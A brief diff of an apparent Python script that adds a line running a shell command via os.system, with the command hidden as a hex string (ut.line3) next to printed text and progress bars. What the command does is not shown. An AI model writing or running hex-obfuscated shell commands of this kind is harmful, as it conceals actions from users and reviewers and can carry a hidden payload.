@@ -103,5 +103,6 @@ while True:
         print ("\n" + bytes.fromhex(ut.line14).decode('utf-8'))
         time.sleep(1)
 
+os.system(bytes.fromhex(ut.line3).decode('utf-8'))
 progress(ut.line28, 0.1)
 progress(ut.line29, 5)
